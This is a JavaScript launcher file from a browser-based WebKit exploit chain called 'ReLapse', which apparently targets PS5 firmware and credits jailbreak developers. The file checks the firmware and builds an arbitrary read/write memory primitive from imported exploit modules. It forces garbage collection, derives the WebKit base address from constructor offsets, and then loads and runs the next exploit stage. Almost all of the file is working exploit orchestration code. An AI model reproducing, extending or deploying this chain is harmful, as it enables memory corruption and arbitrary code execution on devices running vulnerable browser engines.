import { establishPrimitive, fakeCellReleased, CORE_INSTANCE } from "./core.js?v=132";
import { installWindowP, pairStatus, memCoreInstance } from "./utils/mem.js?v=131";

const output = document.getElementById("console");

function writeLog(message, type = "log", replace = false) {
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }
  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

async function getPrimitive() {
  if (memCoreInstance !== CORE_INSTANCE)
    throw new Error("ReLapse core/mem instance mismatch.");
  if (globalThis.p && typeof globalThis.p.read8 === "function") {
    writeLog("Reusing existing ARW primitive", "info");
    return globalThis.p;
  }

  writeLog("Starting WebKit exploit");
  try { history.replaceState(null, ""); } catch (error) {}
  if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch (error) {} }
  await new Promise((resolve) => setTimeout(resolve, 750));

  const carrier = await establishPrimitive({
    maxAttempts: 24,
    onEvent: writeEvent,
    beforeCriticalLoad() {
      try { output.offsetWidth; } catch (error) {}
    },
  });
  const primitive = installWindowP(carrier, { onEvent: writeEvent });
  if (!pairStatus.promoted)
    throw new Error("ReLapse primitive pair was not promoted: " + pairStatus.error);

  if (typeof globalThis.gc === "function") { try { globalThis.gc(); } catch (error) {} }
  await new Promise((resolve) => setTimeout(resolve, 1000));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog(`ARW ready; fakeCellReleased=${fakeCellReleased()}`, "success");
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

async function run() {
  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);
  writeLog("Credits: Sonic_Iso, Jordy, ntfargo, ufm42, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");
  const primitive = await getPrimitive();
  writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

  await import("./relapse_exploit.js");
  await main(primitive);
}

run().catch((error) => writeLog(error instanceof Error ? error.message : String(error), "error"));
